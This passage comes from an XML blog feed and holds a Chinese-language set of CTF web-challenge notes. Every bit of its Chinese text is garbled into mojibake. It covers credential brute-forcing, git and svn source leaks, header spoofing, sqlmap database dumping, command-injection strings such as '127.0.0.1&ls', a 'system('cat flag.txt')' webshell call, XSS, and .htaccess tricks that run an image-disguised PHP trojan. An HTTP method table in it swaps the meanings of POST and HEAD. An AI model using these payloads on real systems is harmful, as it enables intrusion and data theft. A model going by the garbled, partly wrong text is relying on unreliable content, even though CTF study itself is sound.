é€ã€‚å½“ç”¨æˆ·åœ¨ä¸€ä¸ªHTMLæ–‡æ¡£ä¸­å®šä¹‰äº†ä¸€ä¸ªè¶…æ–‡æœ¬é“¾åï¼Œæµè§ˆå™¨å°†é€šè¿‡TCP/IPåè®®ä¸æŒ‡å®šçš„æœåŠ¡å™¨å»ºç«‹è¿æ¥ã€‚</p><hr><table><thead><tr><th>HTTPæ–¹æ³•</th><th>ä½œç”¨æè¿°</th></tr></thead><tbody><tr><td>GET</td><td>å®¢æˆ·ç«¯è¯·æ±‚æŒ‡å®šèµ„æºä¿¡æ¯ï¼ŒæœåŠ¡å™¨è¿”å›æŒ‡å®šèµ„æº</td></tr><tr><td>POST</td><td>åªè¯·æ±‚å“åº”æŠ¥æ–‡ä¸­çš„HTTPé¦–éƒ¨</td></tr><tr><td>HEAD</td><td>å°†å®¢æˆ·ç«¯çš„æ•°æ®æäº¤åˆ°æœåŠ¡å™¨ï¼Œä¾‹ï¼šæ³¨å†Œè¡¨å•</td></tr><tr><td>PUT</td><td>ä»å®¢æˆ·ç«¯å‘æœåŠ¡å™¨ä¼ é€çš„æ•°æ®å–ä»£æŒ‡å®šçš„æ–‡æ¡£å†…å®¹</td></tr><tr><td>DELETE</td><td>è¯·æ±‚æœåŠ¡å™¨åˆ é™¤Request-URIæ‰€æ ‡è¯†çš„èµ„æº</td></tr><tr><td>MOVE</td><td>è¯·æ±‚æœåŠ¡å™¨å°†åˆ¶å®šçš„é¡µé¢ç§»è‡³å¦ä¸€ä¸ªç½‘ç»œåœ°å€</td></tr></tbody></table><p>HTTPçŠ¶æ€ç <br>æ‰€æœ‰HTTPå“åº”çš„ç¬¬ä¸€è¡Œéƒ½æ˜¯çŠ¶æ€è¡Œï¼Œä¾æ¬¡æ˜¯å½“å‰HTTPç‰ˆæœ¬å·ï¼Œ3ä½æ•°å­—ç»„æˆçš„çŠ¶æ€ä»£ç ï¼Œä»¥åŠæè¿°çŠ¶æ€çš„çŸ­è¯­ï¼Œå½¼æ­¤ç”±ç©ºæ ¼åˆ†éš”ã€‚çŠ¶æ€ä»£ç çš„ç¬¬ä¸€ä¸ªæ•°å­—ä»£è¡¨å½“å‰å“åº”çš„ç±»å‹ï¼š</p><ul><li>1xxæ¶ˆæ¯â€”â€”è¯·æ±‚å·²è¢«æœåŠ¡å™¨æ¥æ”¶ï¼Œç»§ç»­å¤„ç†</li><li>2xxæˆåŠŸâ€”â€”è¯·æ±‚å·²æˆåŠŸè¢«æœåŠ¡å™¨æ¥æ”¶ã€ç†è§£ã€å¹¶æ¥å—</li><li>3xxé‡å®šå‘â€”â€”éœ€è¦åç»­æ“ä½œæ‰èƒ½å®Œæˆè¿™ä¸€è¯·æ±‚</li><li>4xxè¯·æ±‚é”™è¯¯â€”â€”è¯·æ±‚å«æœ‰è¯æ³•é”™è¯¯æˆ–è€…æ— æ³•è¢«æ‰§è¡Œ</li><li>5xxæœåŠ¡å™¨é”™è¯¯â€”â€”æœåŠ¡å™¨åœ¨å¤„ç†æŸä¸ªæ­£ç¡®è¯·æ±‚æ—¶å‘ç”Ÿé”™è¯¯</li></ul>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctf-web</title>
    <link href="/2020/11/24/ctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/11/24/ctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="åŸºç¡€è®¤è¯é¢˜"><a href="#åŸºç¡€è®¤è¯é¢˜" class="headerlink" title="åŸºç¡€è®¤è¯é¢˜"></a>åŸºç¡€è®¤è¯é¢˜</h2><p><img src="https://img-blog.csdnimg.cn/20201123215812631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><br>é¡µé¢ä¸­ä¾æ®æç¤º å¯çŒœæµ‹ç”¨æˆ·ä¸ºadmin<br>å¯å¼±å£ä»¤å°è¯•ï¼ˆadminï¼‰â€”â€”å¤±è´¥<br>æš´è„¾æ°”ï¼Œï¼Œï¼Œè¯å…¸çˆ†ç ´ï¼<br>ä¸‹è½½å…¶é¡µé¢æä¾›çš„è¯å…¸<br>æŠ“åŒ…å¤„å¯¹ä¸Šå›¾circleå¤„è¿›è¡Œè§£å¯† åœ¨burpçš„decodeæ¨¡æ¿ä¸­è¿›è¡ŒæŸ¥è¯¢å¯çŸ¥å…¶åŠ å¯†æ–¹å¼ä¸ºbase64<br>è½½å…¥è¯å…¸<br>æ­¤å¤„å¼€å§‹èµ°å¼¯è·¯ï¼š1.è¯å…¸æ‰€åŠ è½½çš„å‡ä¸ºå¯†ç ï¼Œç¼ºå°‘ç”¨æˆ·åï¼ˆå‘ç°é—®é¢˜åï¼Œåº¦å¨˜å­¦ä¹ æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¾ˆå¥½ï¼Œåˆå­¦äº†ä¸ªå¥‡å¥‡æ€ªæ€ªçš„å§¿åŠ¿ï¼‰2.è¯å…¸çˆ†ç ´åä¸€ç›´éƒ½æ˜¯401è¿”å›ï¼Œé•¿åº¦å‡ä¸º404ï¼Œæ²¡æœ‰å‡ºç°200è¿”å›ï¼ˆåŸå› æœªæ˜ï¼‰<br>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”æˆ‘æ˜¯åˆ†å‰²çº¿â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”<br>æŠ˜è…¾ä¸€æ®µæ—¶é—´åï¼ˆæ›¿æ¢çˆ†ç ´ç‚¹ï¼ŒåŠ è½½è¯å…¸ï¼Œè®¾ç½®è§£å¯†æ–¹å¼ï¼‰ï¼ŒæˆåŠŸçˆ†ç ´å‡ºé•¿åº¦ä¸º200</p><h2 id="Gitæ³„éœ²"><a href="#Gitæ³„éœ²" class="headerlink" title="Gitæ³„éœ²"></a>Gitæ³„éœ²</h2><p>è¦ç”¨åˆ°å·¥å…·Githack,è™šæ‹Ÿæœºä¸€æ‰¾ï¼Œæ²¡æœ‰ï¼Œç½‘ä¸ŠæŸ¥æ‰¾Githackå®‰è£…ï¼Œï¼Ÿï¼Ÿï¼Ÿæ²¡æœ‰è¾“å…¥æ³•å—ï¼Œæ‰è¿›ä¸€ä¸ªå¤§å‘â€¦â€¦é…ç½®æºï¼Œä½¿ç”¨sudoï¼Œdpkgå‘½ä»¤â€¦â€¦æš‚æ—¶åšä¸ä¸‹å»äº†<br><img src="https://img-blog.csdnimg.cn/20201124083620314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"></p><h2 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h2><p>æœç´ å¼•æ“çˆ¬å–å„ä¸ªç½‘ç«™æ—¶ï¼Œç½‘ç«™å‘ŠçŸ¥æœç´¢å¼•æ“çš„çˆ¬å–èŒƒå›´ï¼ˆè®¾ç½®çˆ¬å–æƒé™ï¼‰,robots.txtå°±ä½œä¸ºæœç´ å¼•æ“çˆ¬å–ç½‘ç«™æ—¶ç¬¬ä¸€ä¸ªéœ€è¦æŸ¥çœ‹çš„æ–‡ä»¶</p><h2 id="ç°è‰²æŒ‰é’®ï¼ˆdisabled-buttonï¼‰"><a href="#ç°è‰²æŒ‰é’®ï¼ˆdisabled-buttonï¼‰" class="headerlink" title="ç°è‰²æŒ‰é’®ï¼ˆdisabled buttonï¼‰"></a>ç°è‰²æŒ‰é’®ï¼ˆdisabled buttonï¼‰</h2><p>åˆ©ç”¨å¼€å‘è€…å·¥å…·æŸ¥çœ‹æºä»£ç ï¼Œç›´æ¥ä¿®æ”¹æŒ‰é’®å¯¹åº”çš„ä»£ç å¤„ï¼ˆåˆ é™¤æˆ–æ³¨é‡Šæ‰å¸¦æœ‰ç¦ç”¨æŒ‰é’®çš„ä»£ç ï¼‰æ¶‰åŠåˆ°htmlå’Œphpçš„å­¦ï¿½</p><h2 id="cookies"><a href="#cookies" class="headerlink" title="cookies"></a>cookies</h2><p>æœåŠ¡å™¨å¯ä»¥åˆ©ç”¨CookiesåŒ…å«ä¿¡æ¯çš„ä»»æ„æ€§æ¥ç­›é€‰å¹¶ç»å¸¸æ€§ç»´æŠ¤è¿™äº›ä¿¡æ¯ï¼Œä»¥åˆ¤æ–­åœ¨HTTPä¼ è¾“ä¸­çš„çŠ¶æ€ã€‚Cookiesæœ€å…¸å‹çš„åº”ç”¨æ˜¯åˆ¤å®šæ³¨å†Œç”¨æˆ·æ˜¯å¦å·²ç»ç™»å½•ç½‘ç«™ï¼Œç”¨æˆ·å¯èƒ½ä¼šå¾—åˆ°æç¤ºï¼Œæ˜¯å¦åœ¨ä¸‹ä¸€æ¬¡è¿›å…¥æ­¤ç½‘ç«™æ—¶ä¿ç•™ç”¨æˆ·ä¿¡æ¯ä»¥ä¾¿ç®€åŒ–ç™»å½•æ‰‹ç»­ï¼Œè¿™äº›éƒ½æ˜¯Cookiesçš„åŠŸç”¨ã€‚å¦ä¸€ä¸ªé‡è¦åº”ç”¨åœºåˆæ˜¯â€œè´­ç‰©è½¦â€ä¹‹ç±»å¤„ç†ã€‚ç”¨æˆ·å¯èƒ½ä¼šåœ¨ä¸€æ®µæ—¶é—´å†…åœ¨åŒä¸€å®¶ç½‘ç«™çš„ä¸åŒé¡µé¢ä¸­é€‰æ‹©ä¸åŒçš„å•†å“ï¼Œè¿™äº›ä¿¡æ¯éƒ½ä¼šå†™å…¥Cookiesï¼Œä»¥ä¾¿åœ¨æœ€åä»˜æ¬¾æ—¶æå–ä¿¡æ¯ã€‚</p><h2 id="HTTPä¸­çš„GETå’ŒPOSTä¼ å‚"><a href="#HTTPä¸­çš„GETå’ŒPOSTä¼ å‚" class="headerlink" title="HTTPä¸­çš„GETå’ŒPOSTä¼ å‚"></a>HTTPä¸­çš„GETå’ŒPOSTä¼ å‚</h2><p>GETä¼ å‚åœ¨URLåœ°å€æ ç›´æ¥åé¢è·Ÿ <strong>/?å‚æ•°å+æ•°å€¼</strong><br>å¦‚ /?a=1 ä¼ å‚a=1<br>POSTä¼ å‚ä¸èƒ½ç›´æ¥åœ¨URLæ é‡Œè¾“å…¥ï¼Œä½¿ç”¨æ’ä»¶hackbarï¼Œå¯ä»¥è¿›è¡Œpostä¼ å‚</p><hr><p>postä¼ å‚æœ‰å››ç§æ–¹å¼ï¼ŒåŸºæœ¬æ ·å¼å¦‚ä¸‹ï¼š</p><p>POST <a href="http://www.example.com/">http://www.example.com</a> HTTP/1.1<br>Content-Type: application/x-www-form-urlencoded;charset=utf-8<br>title=test&amp;sub%5B%5D=1&amp;sub%5B%5D=2&amp;sub%5B%5D=3</p><hr><h2 id="IPä¼ªé€ -xffå’Œreferer"><a href="#IPä¼ªé€ -xffå’Œreferer" class="headerlink" title="IPä¼ªé€ -xffå’Œreferer"></a>IPä¼ªé€ -xffå’Œreferer</h2><p>æŠ“åŒ…åæ”¹åŒ…ï¼š<br>æ·»åŠ  X-Forwarded-Forï¼šip Refererï¼šç½‘ç«™<br>ipå’Œç½‘ç«™å‡æ˜¯è¦ä¼ªé€ çš„å¯¹è±¡</p><p>X-Forwarded-Foræ˜¯ç”¨äºè®°å½•ä»£ç†ä¿¡æ¯çš„ï¼Œæ¯ç»è¿‡ä¸€çº§ä»£ç†(åŒ¿åä»£ç†é™¤å¤–)ï¼Œä»£ç†æœåŠ¡å™¨éƒ½ä¼šæŠŠè¿™æ¬¡è¯·æ±‚çš„æ¥æºIPè¿½åŠ åœ¨X-Forwarded-Forä¸­ï¼ŒX-Real-IPï¼Œä¸€èˆ¬åªè®°å½•çœŸå®å‘å‡ºè¯·æ±‚çš„å®¢æˆ·ç«¯IP</p><h2 id="curl-â€“local-port-xx"><a href="#curl-â€“local-port-xx" class="headerlink" title="curl â€“local-port xx"></a>curl â€“local-port xx</h2><p><a href="http://web.jarvisoj.com:32770/">http://web.jarvisoj.com:32770/</a></p><h3 id="Please-use-port-51-to-visit-this-site"><a href="#Please-use-port-51-to-visit-this-site" class="headerlink" title="Please use port 51 to visit this site."></a>Please use port 51 to visit this site.</h3><p>curl â€“local-port 51 <a href="http://web.jarvisoj.com:32770/">http://web.jarvisoj.com:32770/</a></p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>ä½¿ç”¨èšå‰‘æˆ–postæ–¹å¼ ä½¿ç”¨shell=system(â€˜cat flag.txtâ€™)</p><h2 id="å‘½ä»¤æ‰§è¡Œæ¼æ´"><a href="#å‘½ä»¤æ‰§è¡Œæ¼æ´" class="headerlink" title="å‘½ä»¤æ‰§è¡Œæ¼æ´"></a>å‘½ä»¤æ‰§è¡Œæ¼æ´</h2><p>ç”±äºè¾“å…¥å¯¹ç®¡é“ç¬¦ | || &amp; &amp;&amp;è¿‡æ»¤ä¸ä¸¥äº§ç”Ÿçš„æ¼æ´<br>windowsæˆ–linuxä¸‹:</p><table><thead><tr><th align="center">æ ¼å¼</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">command1 &amp;&amp; command2</td><td align="center">å…ˆæ‰§è¡Œcommand1ï¼Œå¦‚æœä¸ºçœŸï¼Œå†æ‰§è¡Œcommand2</td></tr><tr><td align="center">command1| command2</td><td align="center">åªæ‰§è¡Œcommand2</td></tr><tr><td align="center">command1 &amp; command2</td><td align="center">å…ˆæ‰§è¡Œcommand2åæ‰§è¡Œcommand1</td></tr><tr><td align="center">command1|| command2</td><td align="center">å…ˆæ‰§è¡Œcommand1ï¼Œå¦‚æœä¸ºå‡ï¼Œå†æ‰§è¡Œcommand2</td></tr></tbody></table><h2 id="gitæ³„éœ²"><a href="#gitæ³„éœ²" class="headerlink" title="gitæ³„éœ²"></a>gitæ³„éœ²</h2><p>Windowsä¸‹githackä¸‹è½½ä¸å‡ºç°./../.git<br>åªä¸‹è½½äº†50xå’Œindex ï¼ˆåŸå› ä¸æ˜ï¼ï¼‰â€“è¡¥å……ï¼šä½¿ç”¨äº†æ—§ç‰ˆæœ¬çš„Githuack<br><img src="https://img-blog.csdnimg.cn/20210120134909178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">kaliå†…åˆ©ç”¨githack å´æœªå‘ç°50xå’Œindex</p><hr><blockquote><p>git log #æŸ¥çœ‹æäº¤å†å²</p></blockquote><p><strong>æ–¹æ³•ä¸€ï¼š</strong><br>åœ¨ç›®æ ‡æ–‡ä»¶å¤¹ç»ˆç«¯ç›´æ¥git showå‡ºç­”æ¡ˆ</p><blockquote><p>git showï¼šæ˜¾ç¤ºä¸€ä¸ªæˆ–å¤šä¸ªå¯¹è±¡(<code>blobs</code>ï¼Œæ ‘ï¼Œæ ‡ç­¾å’Œæäº¤)ã€‚å¯¹äºæäº¤ï¼Œå®ƒè¿˜èƒ½<strong>æ˜¾ç¤ºæ—¥å¿—æ¶ˆæ¯å’Œæ–‡æœ¬å·®å¼‚ã€‚</strong></p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210120134849174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><strong>æ–¹æ³•äºŒï¼š</strong><br>ä¹Ÿå¯ä»¥ä½¿ç”¨git reset â€“hard â€œadd flagçš„é‚£ä¸ªåºåˆ—å·â€å›é€€å­˜æœ‰flagçš„ç‰ˆæœ¬</p><blockquote><p>git reset åºåˆ—å·ï¼šå›é€€ç‰ˆæœ¬</p></blockquote><p>æ­¤æ—¶æ–‡ä»¶å¤¹å†…å‡ºç°50xå’Œindexä»¥åŠä¸€ä¸ªflagçš„txt<br><img src="https://img-blog.csdnimg.cn/20210121000823424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><blockquote><p>dvcs-ripper å‚æ•°:</p><p>-c perform â€˜hg revertâ€™ on end (default)<br>-b &lt;s&gt; Use branch &lt;s&gt; (default: )<br>-a &lt;s&gt; Use agent &lt;s&gt; (default: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:10.0.2) Gecko/20100101 Firefox/10.0.2)<br>-s do not verify SSL cert<br>-p &lt;h&gt; use proxy <h> for connections<br>-v verbose (-vv will be more verbose)</p></blockquote><h2 id="svnæ³„éœ²"><a href="#svnæ³„éœ²" class="headerlink" title="svnæ³„éœ²"></a>svnæ³„éœ²</h2><p><img src="https://img-blog.csdnimg.cn/20210311104348703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="hgæ³„éœ²"><a href="#hgæ³„éœ²" class="headerlink" title="hgæ³„éœ²"></a>hgæ³„éœ²</h2><p><img src="https://img-blog.csdnimg.cn/20210311104126693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>åŸæ–‡ä»¶ä¸å­˜åœ¨ï¼Œç›´æ¥åœ¨urlå¾—åˆ°<img src="https://img-blog.csdnimg.cn/20210311104220836.png"></p><hr><h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><p>ä½¿ç”¨sqlmap<br>æ•´æ•°å‹ä»¥åŠå­—ç¬¦å‹ï¼š<br><code>python3 sqlmap.py -u &quot;url&quot; --cookie=&quot;&quot;</code>ï¼ˆâ… ï¼‰<br>ï¼ˆâ… ï¼‰è·Ÿå‚æ•°â€“current-db<br>ï¼ˆâ… ï¼‰è·Ÿå‚æ•°-D æ•°æ®åº“å â€“tables<br>ï¼ˆâ… ï¼‰è·Ÿå‚æ•°-D æ•°æ®åº“å -T è¡¨å â€“columns<br>ï¼ˆâ… ï¼‰è·Ÿå‚æ•°-D æ•°æ®åº“å -T è¡¨å (-ï¼£ åˆ—å) â€“dump</p><h2 id="å‘½ä»¤æ³¨å…¥"><a href="#å‘½ä»¤æ³¨å…¥" class="headerlink" title="å‘½ä»¤æ³¨å…¥"></a>å‘½ä»¤æ³¨å…¥</h2><p><code>127.0.0.1&amp;ls</code><br>å‡ºæ¥ä¸€ä¸ª<code>*.php</code><br>æ­¤æ—¶æ‹¼æ¥<code>cat *.php</code>æ— å›æ˜¾ï¼ˆ<a href="https://xz.aliyun.com/t/8125">ä¼ é€é—¨</a>ï¼‰<br>æ­¤å¤„æ˜¯å­—ç¬¦ç¼–ç çš„é—®é¢˜ åé¢è·Ÿ<code>| base64</code>å‡ºç°ä¸€å †å­—ç¬¦åå¤åˆ¶è§£ç å³å¯</p><h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>åœ¨xsså¹³å°ä¸Šæ³¨å†Œè´¦å· å»ºç«‹ä¸€ä¸ªé¡¹ç›®ï¼ˆå‹¾é€‰é»˜è®¤é…ç½®å³å¯ï¼‰<br>å¤åˆ¶xssä»£ç <br><img src="https://img-blog.csdnimg.cn/20210218112452696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"> å…ˆåœ¨ç¬¬ä¸€æ éšä¾¿è¾“å…¥å­—ç¬¦<br>ç„¶åå¤åˆ¶urlåˆ°ç¬¬äºŒæ  å¹¶ä¸”æ›´æ”¹åˆšåˆšçš„å­—ç¬¦ æ›¿æ¢æ‹¼æ¥ä¸ºxssä»£ç <br>å‘é€è‡³æœåŠ¡å™¨å³å¯<br><img src="https://img-blog.csdnimg.cn/20210218112842968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">åœ¨é¡¹ç›®é‡Œè¾¹å¯ä»¥çœ‹åˆ°åå¼¹å›æ¥çš„å†…å®¹<br><img src="https://img-blog.csdnimg.cn/20210218112901552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h2><p>vimæ˜¯ä¸€ç§å¼€æºç¼–è¾‘å™¨ï¼Œç”±äºåœ¨ä½¿ç”¨vimæ—¶ä¼šåˆ›å»ºä¸´æ—¶ç¼“å­˜æ–‡ä»¶ï¼Œå…³é—­vimæ—¶ç¼“å­˜æ–‡ä»¶åˆ™ä¼šè¢«åˆ é™¤ï¼Œå½“vimå¼‚å¸¸é€€å‡ºåï¼Œå› ä¸ºæœªå¤„ç†ç¼“å­˜æ–‡ä»¶ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡ç¼“å­˜æ–‡ä»¶æ¢å¤åŸå§‹æ–‡ä»¶å†…å®¹ï¼š<br>ç¬¬ä¸€æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åä¸º <code>. .swp</code><br>å†æ¬¡æ„å¤–é€€å‡ºåï¼Œå°†ä¼šäº§ç”Ÿåä¸º<code>. .swo</code>çš„äº¤æ¢æ–‡ä»¶<br>ç¬¬ä¸‰æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åˆ™ä¸º<code>. .swn</code><br>æ­¤é¢˜ä½¿ç”¨ç»ˆç«¯å‘½ä»¤<code>vim -r index.php.swp</code>æ¢å¤åŸæ–‡ä»¶å³å¯</p><h2 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h2><p>.DS_Store æ˜¯ Mac OS ä¿å­˜æ–‡ä»¶å¤¹çš„è‡ªå®šä¹‰å±æ€§çš„éšè—æ–‡ä»¶ã€‚é€šè¿‡.DS_Storeå¯ä»¥çŸ¥é“è¿™ä¸ªç›®å½•é‡Œé¢æ‰€æœ‰æ–‡ä»¶çš„æ¸…å•ã€‚<br>åˆ©ç”¨å·¥å…·dsstore:<code>python3 main.py .DS_Store</code>å¯¼å‡ºä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶</p><h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><p><a href="https://www.secpulse.com/archives/95987.html">æ–‡ä»¶ä¸Šä¼ å¸¸è§å§¿åŠ¿</a></p><h4 id="jså‰ç«¯éªŒè¯"><a href="#jså‰ç«¯éªŒè¯" class="headerlink" title="jså‰ç«¯éªŒè¯"></a>jså‰ç«¯éªŒè¯</h4><p>å†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ æŸ¥çœ‹æºç å¯çŸ¥åªå…è®¸ä¸Šä¼ å›¾ç‰‡æ ¼å¼<br>æ›´æ”¹æ–‡ä»¶åç¼€å æŠ“åŒ…åæ”¹å›åç¼€ ä¸Šä¼ åè¿æ¥èšå‰‘<br>ä¹Ÿå¯ä»¥ç›´æ¥ç¦ç”¨jsç›´æ¥ä¸Šï¿½</p><p>DVWAä¸­çº§æ–‡ä»¶ä¸Šä¼ åˆ™æ˜¯é€šè¿‡Content-Typeåœ¨æœåŠ¡ç«¯MIMEæ£€æµ‹</p><h4 id="MIMEç»•è¿‡"><a href="#MIMEç»•è¿‡" class="headerlink" title="MIMEç»•è¿‡"></a>MIMEç»•è¿‡</h4><p>ä¿®æ”¹Content-Typeä¸ºimage/jpegã€image/pngã€image/gif</p><h4 id="htaccessæ–‡ä»¶"><a href="#htaccessæ–‡ä»¶" class="headerlink" title=".htaccessæ–‡ä»¶"></a>.htaccessæ–‡ä»¶</h4><p>ç™¾åº¦ç™¾ç§‘ï¼š<img src="https://img-blog.csdnimg.cn/20210223002229696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p>åˆ©ç”¨æ¡ä»¶</p><ul><li><p><input checked="" disabled="" type="checkbox">  apacheæœåŠ¡å™¨</p></li><li><p><input checked="" disabled="" type="checkbox">  èƒ½å¤Ÿä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œä¸€èˆ¬ä¸ºé»‘åå•é™åˆ¶ã€‚</p></li><li><p><input checked="" disabled="" type="checkbox">  AllowOverride Allï¼Œé»˜è®¤é…ç½®ä¸ºå…³é—­Noneã€‚</p></li><li><p><input checked="" disabled="" type="checkbox">  ä¸Šä¼ ç›®å½•å…·æœ‰å¯æ‰§è¡Œæƒé™LoadModule rewrite_module modules/mod_rewrite.so #æ¨¡å—ä¸ºå¼€å¯çŠ¶æ€</p></li></ul><p>å†™ä¸€ä¸ª<code>.htaccess</code>æ–‡ä»¶ï¼š</p><ul><li>æ­£åˆ™åŒ¹é…åä¸ºtestçš„æ–‡ä»¶ å½“ä½œphpæ–‡ä»¶è§£æ ï¼š</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;test&quot;</span>&gt;</span><br> <span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><p>æˆ–ï¼š</p><ul><li>ä»¥phpè§£æ.htaccessæ–‡ä»¶æ‰€åœ¨ç›®å½•åŠå…¶å­ç›®å½•ä¸­çš„åç¼€ä¸º.xxxçš„æ–‡ä»¶æ–‡ä»¶</li></ul><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php xxx<br><br>(AddHandler php5-<span class="hljs-keyword">script</span> php)<br></code></pre></td></tr></table></figure><p>ç„¶åç›´æ¥ä¸€å¥è¯ä»¥phpè§£æ.htaccessæ–‡ä»¶æ‰€åœ¨ç›®å½•åŠå…¶å­ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶ ä¸Šä¼ ä¸€ä¸ªtest.jpgçš„ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åè¿æ¥èšå‰‘å³å¯</p><h4 id="user-iniæ–‡ä»¶"><a href="#user-iniæ–‡ä»¶" class="headerlink" title=".user.iniæ–‡ä»¶"></a>.user.iniæ–‡ä»¶</h4><p>ä¸Šé¢çš„æ˜¯å¯¹apacheèµ·ä½œç”¨çš„ï¼Œè€Œè¿™ä¸ªæ˜¯å¯¹ä»¥fastcgiè¿è¡Œçš„phpèµ·ä½œç”¨çš„ï¼Œä¸ç®¡ä»–çš„æœåŠ¡å™¨æ˜¯nginx/apache/IISï¼ŒèŒƒå›´æ›´å¹¿</p><p>php.iniæ˜¯phpçš„é…ç½®æ–‡ä»¶ï¼Œé€šå¸¸ä¸‹è½½ä¸‹æ¥çš„phpéƒ½æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œæœ‰ä¸¤ä¸ªé¢„ç½®çš„iniæ¨¡æ¿ï¼Œphp.ini-developmentå’Œphp.ini-production,å‰è€…æ˜¯å¼€å‘ç¯å¢ƒæ¨èçš„ï¼Œå…è®¸è°ƒè¯•ï¼Œå°‘å èµ„æºï¼›åè€…æ˜¯ä¸Šçº¿äº§å“æ—¶çš„ç¯å¢ƒæ¨èï¼Œç¦æ­¢æŠ¥é”™ï¼Œæé«˜æ€§èƒ½</p><p>php.iniåŒ…æ‹¬äº†å¾ˆå¤šphpçš„é…ç½®ï¼Œè¿™äº›é…ç½®ä¸­ï¼Œåˆåˆ†ä¸ºå‡ ç§ï¼š<code>PHP_INI_SYSTEM</code>ã€<code>PHP_INI_PERDIR</code>ã€<code>PHP_INI_ALL</code>ã€<code>PHP_INI_USER</code>ã€‚</p><p>é™¤äº†ä¸» php.ini ä¹‹å¤–ï¼ŒPHP è¿˜ä¼šåœ¨æ¯ä¸ªç›®å½•ä¸‹æ‰«æ ini æ–‡ä»¶ï¼Œä»è¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶æ‰€åœ¨ç›®å½•å¼€å§‹ä¸€ç›´ä¸Šå‡åˆ° web æ ¹ç›®å½•ï¼ˆ<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> æ‰€æŒ‡å®šçš„ï¼‰ã€‚å¦‚æœè¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶åœ¨ web æ 